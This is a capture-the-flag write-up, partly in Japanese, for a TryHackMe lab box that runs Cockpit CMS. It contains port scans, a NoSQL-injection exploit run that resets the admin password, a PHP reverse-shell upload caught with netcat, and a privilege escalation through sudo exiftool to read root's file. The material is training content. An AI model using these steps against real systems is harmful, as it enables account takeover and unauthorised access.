## CMSpit
https://tryhackme.com/room/cmspit

## Enum
```
nmap -Pn ip.thm -vv

Scanning ip.thm (10.10.86.1) [1000 ports]
Discovered open port 80/tcp on 10.10.86.1
Discovered open port 22/tcp on 10.10.86.1

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

```
nmap -Pn ip.thm -p- --open --min-rate 1000 -vv

Scanning ip.thm (10.10.86.1) [65535 ports]

Discovered open port 80/tcp on 10.10.86.1
Discovered open port 22/tcp on 10.10.86.1

Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

![image](https://user-images.githubusercontent.com/6504854/187691027-45cd56be-cabe-4a81-a5e9-175403402676.png)

```
searchsploit Cockpit

------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL Injection               | multiple/webapps/50185.py
Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery                                    | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution                                                  | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)                        | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                                         | php/webapps/47305.py
------------------------------------------------------------------------------------------- ---------------------------------
```
🏴 version is 0.11.1 ? Lets's run exploit.　とりまヤマカンでなげてみるYo。

```
python3 50185.py -u http://ip.thm
[+] http://ip.thm: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) :

[+] Users Found : ['admin', 'd********', 's****', 'e*******']

[-] Get user details For : admin
[+] Finding Password reset tokens
         Tokens Found : ['rp-f3016077cdd6a741154f3bc3ebce7fb1630f456fcdd4c']
[+] Obtaining user information
-----------------Details--------------------
         [*] user : admin
         [*] name : Admin
         [*] email : admin@yourdomain.de
         [*] active : True
         [*] group : admin
         [*] password : $2y$10$
         [*] i18n : en
         [*] _created : 1621655201
         [*] _modified : 1621655201
         [*] _id : 60a87ea165343539ee000300
         [*] _reset_token : rp-f3016077cdd6a741154f3bc3ebce7fb1630f456fcdd4c
         [*] md5email : a11eea8bf873a483db461bb169beccec
--------------------------------------------

[+] Do you want to reset the passowrd for admin? (Y/n): y
[-] Attempting to reset admin's password:
[+] Password Updated Succesfully!
[+] The New credentials for admin is:
         Username : admin
         Password : }w5'5o[y;A
```

🏴 Bingo! One more shot! Let's login with admin credential.
```
python3 50185.py -u http://ip.thm
[+] http://ip.thm: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) :

[+] Users Found : ['admin', 'd********', 's****', 'e*******']

[-] Get user details For : skidy
[+] Finding Password reset tokens
         Tokens Found : ['rp-356389a9c87e4f70d335da3420913abb630f464961de0']
[+] Obtaining user information
-----------------Details--------------------
         [*] user : skidy
         [*] email : skidy@****************

--------------------------------------------
```
![image](https://user-images.githubusercontent.com/6504854/187692960-09ccd209-0e85-4fd0-b25f-74dffc602211.png)

![image](https://user-images.githubusercontent.com/6504854/187693271-20e90295-2fcf-4574-9d87-2769fe756e31.png)

🏴 I uploaded 1.php (PHP reverse shell of copying from pentestmonkey)
```
nc -lnvp 4444

curl ip.thm/1.php
```

## Flag
```
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@ubuntu:/$ cd /home
cd /home

www-data@ubuntu:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 May 21  2021 .
drwxr-xr-x 22 root root 4096 May 21  2021 ..
drwxr-xr-x  4 stux stux 4096 May 22  2021 stux

www-data@ubuntu:/home$ cd stux
cd stux

www-data@ubuntu:/home/stux$ ls -la
ls -la
total 44
drwxr-xr-x 4 stux stux 4096 May 22  2021 .
drwxr-xr-x 3 root root 4096 May 21  2021 ..
-rw-r--r-- 1 root root   74 May 22  2021 .bash_history
-rw-r--r-- 1 stux stux  220 May 21  2021 .bash_logout
-rw-r--r-- 1 stux stux 3771 May 21  2021 .bashrc
drwx------ 2 stux stux 4096 May 21  2021 .cache
-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
drwxrwxr-x 2 stux stux 4096 May 21  2021 .nano
-rw-r--r-- 1 stux stux  655 May 21  2021 .profile
-rw-r--r-- 1 stux stux    0 May 21  2021 .sudo_as_admin_successful
-rw-r--r-- 1 root root  312 May 21  2021 .wget-hsts
-rw------- 1 stux stux   46 May 22  2021 user.txt

www-data@ubuntu:/home/stux$ cat .dbshell
cat .dbshell
show
show dbs
use admin
use sudousersbak
show dbs
db.user.insert({name: "stux", name: "p4ssw0rd***************"})
show dbs
db.flag.insert({name: "thm{*************************************}"})

www-data@ubuntu:/home/stux$ su stux
su stux
Password: p4ssw0rd***************

stux@ubuntu:~$ cat user.txt

stux@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```
🏴 exiftool ??? 🤔

```
searchsploit exiftool
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                                                  | linux/local/50911.py
------------------------------------------------------------------------------------------- ---------------------------------
```
🏴 I checked this py code and found CVE number. 😋

```
stux@ubuntu:~$ LFILE=/root/root.txt
LFILE=/root/root.txt

stux@ubuntu:~$ OUTPUT=/tmp/root
OUTPUT=/tmp/root

stux@ubuntu:~$ sudo exiftool -filename=$OUTPUT $LFILE
sudo exiftool -filename=$OUTPUT $LFILE
 1 image files updated
 
stux@ubuntu:~$ cat $OUTPUT
cat $OUTPUT
thm{***********************************************}
```

Thank you for your reading. Happy hacking 😄

## Omake
```
stux@ubuntu:~$ ls -l /usr/bin/pkexec
ls -l /usr/bin/pkexec
ls: cannot access '/usr/bin/pkexec': No such file or directory
```
めげずにPolkit投げてみたけどうごかね。（投げればいいと思っている）
